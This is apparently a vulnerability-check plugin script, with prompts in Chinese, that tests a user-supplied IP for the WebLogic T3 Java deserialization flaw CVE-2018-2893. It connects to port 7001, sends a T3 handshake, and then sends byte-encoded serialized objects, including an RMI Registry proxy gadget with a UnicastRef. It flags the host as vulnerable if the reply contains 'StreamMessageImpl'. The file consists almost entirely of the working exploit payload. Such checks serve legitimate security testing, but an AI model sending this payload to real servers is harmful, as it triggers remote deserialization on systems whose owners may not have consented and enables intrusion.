#define findstr = StreamMessageImpl
function main(args)
{
	print("请输入测试ip:");
	ip = input();
	socket = CreateTCPSocket(ip,7001);
	byte1 = GetBytes("116,51,32,49,50,46,50,46,49,10,65,83,58,50,53,53,10,72,76,58,49,57,10,77,83,58,49,48,48,48,48,48,48,48,10,10");
	TCPSocketSend(socket,byte1);
	TCPSocketRecv(socket);
	byte2 = GetBytes("0,0,5,195,1,101,1,255,255,255,255,255,255,255,255,0,0,0,106,0,0,234,96,0,0,0,25,0,147,123,72,74,86,250,74,119,118,102,245,129,218,164,245,185,14,42,235,252,96,116,153,180,2,121,115,114,0,120,114,1,120,114,2,120,112,0,0,0,10,0,0,0,3,0,0,0,0,0,0,0,6,0,112,112,112,112,112,112,0,0,0,10,0,0,0,3,0,0,0,0,0,0,0,6,0,112,6,254,1,0,0,172,237,0,5,115,114,0,29,119,101,98,108,111,103,105,99,46,114,106,118,109,46,67,108,97,115,115,84,97,98,108,101,69,110,116,114,121,47,82,101,129,87,244,249,237,12,0,0,120,112,114,0,36,119,101,98,108,111,103,105,99,46,99,111,109,109,111,110,46,105,110,116,101,114,110,97,108,46,80,97,99,107,97,103,101,73,110,102,111,230,247,35,231,184,174,30,201,2,0,8,73,0,5,109,97,106,111,114,73,0,5,109,105,110,111,114,73,0,12,114,111,108,108,105,110,103,80,97,116,99,104,73,0,11,115,101,114,118,105,99,101,80,97,99,107,90,0,14,116,101,109,112,111,114,97,114,121,80,97,116,99,104,76,0,9,105,109,112,108,84,105,116,108,101,116,0,18,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,76,0,10,105,109,112,108,86,101,110,100,111,114,113,0,126,0,3,76,0,11,105,109,112,108,86,101,114,115,105,111,110,113,0,126,0,3,120,112,119,2,0,0,120,254,1,0,0,172,237,0,5,115,114,0,29,119,101,98,108,111,103,105,99,46,114,106,118,109,46,67,108,97,115,115,84,97,98,108,101,69,110,116,114,121,47,82,101,129,87,244,249,237,12,0,0,120,112,114,0,36,119,101,98,108,111,103,105,99,46,99,111,109,109,111,110,46,105,110,116,101,114,110,97,108,46,86,101,114,115,105,111,110,73,110,102,111,151,34,69,81,100,82,70,62,2,0,3,91,0,8,112,97,99,107,97,103,101,115,116,0,39,91,76,119,101,98,108,111,103,105,99,47,99,111,109,109,111,110,47,105,110,116,101,114,110,97,108,47,80,97,99,107,97,103,101,73,110,102,111,59,76,0,14,114,101,108,101,97,115,101,86,101,114,115,105,111,110,116,0,18,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,91,0,18,118,101,114,115,105,111,110,73,110,102,111,65,115,66,121,116,101,115,116,0,2,91,66,120,114,0,36,119,101,98,108,111,103,105,99,46,99,111,109,109,111,110,46,105,110,116,101,114,110,97,108,46,80,97,99,107,97,103,101,73,110,102,111,230,247,35,231,184,174,30,201,2,0,8,73,0,5,109,97,106,111,114,73,0,5,109,105,110,111,114,73,0,12,114,111,108,108,105,110,103,80,97,116,99,104,73,0,11,115,101,114,118,105,99,101,80,97,99,107,90,0,14,116,101,109,112,111,114,97,114,121,80,97,116,99,104,76,0,9,105,109,112,108,84,105,116,108,101,113,0,126,0,4,76,0,10,105,109,112,108,86,101,110,100,111,114,113,0,126,0,4,76,0,11,105,109,112,108,86,101,114,115,105,111,110,113,0,126,0,4,120,112,119,2,0,0,120,254,1,0,0,172,237,0,5,115,114,0,29,119,101,98,108,111,103,105,99,46,114,106,118,109,46,67,108,97,115,115,84,97,98,108,101,69,110,116,114,121,47,82,101,129,87,244,249,237,12,0,0,120,112,114,0,33,119,101,98,108,111,103,105,99,46,99,111,109,109,111,110,46,105,110,116,101,114,110,97,108,46,80,101,101,114,73,110,102,111,88,84,116,243,155,201,8,241,2,0,6,73,0,5,109,97,106,111,114,73,0,5,109,105,110,111,114,73,0,12,114,111,108,108,105,110,103,80,97,116,99,104,73,0,11,115,101,114,118,105,99,101,80,97,99,107,90,0,14,116,101,109,112,111,114,97,114,121,80,97,116,99,104,91,0,8,112,97,99,107,97,103,101,115,116,0,39,91,76,119,101,98,108,111,103,105,99,47,99,111,109,109,111,110,47,105,110,116,101,114,110,97,108,47,80,97,99,107,97,103,101,73,110,102,111,59,120,114,0,36,119,101,98,108,111,103,105,99,46,99,111,109,109,111,110,46,105,110,116,101,114,110,97,108,46,86,101,114,115,105,111,110,73,110,102,111,151,34,69,81,100,82,70,62,2,0,3,91,0,8,112,97,99,107,97,103,101,115,113");
	TCPSocketSend(socket,byte2);
	byte3 = GetBytes("0,126,0,3,76,0,14,114,101,108,101,97,115,101,86,101,114,115,105,111,110,116,0,18,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,91,0,18,118,101,114,115,105,111,110,73,110,102,111,65,115,66,121,116,101,115,116,0,2,91,66,120,114,0,36,119,101,98,108,111,103,105,99,46,99,111,109,109,111,110,46,105,110,116,101,114,110,97,108,46,80,97,99,107,97,103,101,73,110,102,111,230,247,35,231,184,174,30,201,2,0,8,73,0,5,109,97,106,111,114,73,0,5,109,105,110,111,114,73,0,12,114,111,108,108,105,110,103,80,97,116,99,104,73,0,11,115,101,114,118,105,99,101,80,97,99,107,90,0,14,116,101,109,112,111,114,97,114,121,80,97,116,99,104,76,0,9,105,109,112,108,84,105,116,108,101,113,0,126,0,5,76,0,10,105,109,112,108,86,101,110,100,111,114,113,0,126,0,5,76,0,11,105,109,112,108,86,101,114,115,105,111,110,113,0,126,0,5,120,112,119,2,0,0,120,254,0,255,254,1,0,0,172,237,0,5,115,114,0,19,119,101,98,108,111,103,105,99,46,114,106,118,109,46,74,86,77,73,68,220,73,194,62,222,18,30,42,12,0,0,120,112,119,80,33,0,0,0,0,0,0,0,0,0,13,49,57,50,46,49,54,56,46,49,46,50,50,55,0,18,87,73,78,45,65,71,68,77,86,81,85,66,49,84,54,46,101,104,131,52,140,214,0,0,0,7,0,0,27,89,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,120,254,1,0,0,172,237,0,5,115,114,0,19,119,101,98,108,111,103,105,99,46,114,106,118,109,46,74,86,77,73,68,220,73,194,62,222,18,30,42,12,0,0,120,112,119,32,1,20,220,66,189,7");
	TCPSocketSend(socket,byte3);
	byte4 = GetBytes("26,119,39,0,13,50,52,50,46,50,49,52");
	TCPSocketSend(socket,byte4);
	byte5 = GetBytes("46,49,46,50,53,52,97,134,61,29,0,0,0,0,120");
	TCPSocketSend(socket,byte5);
	byte6 = GetBytes("0,0,4,46,5,101,8,0,0,0,1,0,0,0,27,0,0,0,93,1,1,0,115,114,1,120,112,115,114,2,120,112,0,0,0,0,0,0,0,0,117,114,3,120,112,0,0,0,0,120,116,0,8,119,101,98,108,111,103,105,99,117,114,4,120,112,0,0,0,12,156,151,154,154,140,154,155,207,207,155,147,154,116,0,8,119,101,98,108,111,103,105,99,6,254,1,0,0,172,237,0,5,115,114,0,29,119,101,98,108,111,103,105,99,46,114,106,118,109,46,67,108,97,115,115,84,97,98,108,101,69,110,116,114,121,47,82,101,129,87,244,249,237,12,0,0,120,112,114,0,2,91,66,172,243,23,248,6,8,84,224,2,0,0,120,112,119,2,0,0,120,254,1,0,0,172,237,0,5,115,114,0,29,119,101,98,108,111,103,105,99,46,114,106,118,109,46,67,108,97,115,115,84,97,98,108,101,69,110,116,114,121,47,82,101,129,87,244,249,237,12,0,0,120,112,114,0,19,91,76,106,97,118,97,46,108,97,110,103,46,79,98,106,101,99,116,59,144,206,88,159,16,115,41,108,2,0,0,120,112,119,2,0,0,120,254,1,0,0,172,237,0,5,115,114,0,29,119,101,98,108,111,103,105,99,46,114,106,118,109,46,67,108,97,115,115,84,97,98,108,101,69,110,116,114,121,47,82,101,129,87,244,249,237,12,0,0,120,112,114,0,16,106,97,118,97,46,117,116,105,108,46,86,101,99,116,111,114,217,151,125,91,128,59,175,1,3,0,3,73,0,17,99,97,112,97,99,105,116,121,73,110,99,114,101,109,101,110,116,73,0,12,101,108,101,109,101,110,116,67,111,117,110,116,91,0,11,101,108,101,109,101,110,116,68,97,116,97,116,0,19,91,76,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,59,120,112,119,2,0,0,120,254,1,0,0,172,237,0,5,115,114,0,37,119,101,98,108,111,103,105,99,46,106,109,115,46,99,111,109,109,111,110,46,83,116,114,101,97,109,77,101,115,115,97,103,101,73,109,112,108,107,136,222,77,147,203,212,93,12,0,0,120,114,0,31,119,101,98,108,111,103,105,99,46,106,109,115,46,99,111,109,109,111,110,46,77,101,115,115,97,103,101,73,109,112,108,105,18,97,97,208,77,241,66,12,0,0,120,112,122,0,0,1,37,30,32,0,0,0,0,0,0,1,0,0,1,24,172,237,0,5,115,125,0,0,0,1,0,26,106,97,118,97,46,114,109,105,46,114,101,103,105,115,116,114,121,46,82,101,103,105,115,116,114,121,120,114,0,23,106,97,118,97,46,108,97,110,103,46,114,101,102,108,101,99,116,46,80,114,111,120,121,225,39,218,32,204,16,67,203,2,0,1,76,0,1,104,116,0,37,76,106,97,118,97,47,108,97,110,103,47,114,101,102,108,101,99,116,47,73,110,118,111,99,97,116,105,111,110,72,97,110,100,108,101,114,59,120,112,115,114,0,45,106,97,118,97,46,114,109,105,46,115,101,114,118,101,114,46,82,101,109,111,116,101,79,98,106,101,99,116,73,110,118,111,99,97,116,105,111,110,72,97,110,100,108,101,114,0,0,0,0,0,0,0,2,2,0,0,120,114,0,28,106,97,118,97,46,114,109,105,46,115,101,114,118,101,114,46,82,101,109,111,116,101,79,98,106,101,99,116,211,97,180,145,12,97,51,30,3,0,0,120,112,119,50,0,10,85,110,105,99,97,115,116,82,101,102,0,9,49,50,55,46,48,46,48,46,49,0,0,241,68,0,0,0,0,70,145,31,216,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,120,120,254,1,0,0,172,237,0,5,115,114,0,37,119,101,98,108,111,103,105,99,46,114,106,118,109,46,73,109,109,117,116,97,98,108,101,83,101,114,118,105,99,101,67,111,110,116,101,120,116,221,203,168,112,99,134,240,186,12,0,0,120,114,0,41,119,101,98,108,111,103,105,99,46,114,109,105,46,112,114,111,118,105,100,101,114,46,66,97,115,105,99,83,101,114,118,105,99,101,67,111,110,116,101,120,116,228,99,34,54,197,212,167,30,12,0,0,120,112,119,2,6,0,115,114,0,38,119,101,98,108,111,103,105,99,46,114,109,105,46,105,110,116,101,114,110,97,108,46,77,101,116,104,111,100,68,101,115,99,114,105,112,116,111,114,18,72,90,130,138,247,246,123,12,0,0,120,112,119,52,0,46,97,117,116,104,101,110,116,105,99,97,116,101,40,76,119,101,98,108,111,103,105,99,46,115,101,99,117,114,105,116,121,46,97,99,108,46,85,115,101,114,73,110,102,111,59,41,0,0,0,27,120,120,254,0,255");
	TCPSocketSend(socket,byte6);
	wb = TCPSocketRecv(socket);
	if(StrFindStr(wb,findstr,0) != -1){
		print("检测存在JAVA deserialization漏洞(CVE-2018-2893)")
	}
	CloseTCPSocket(socket);
}
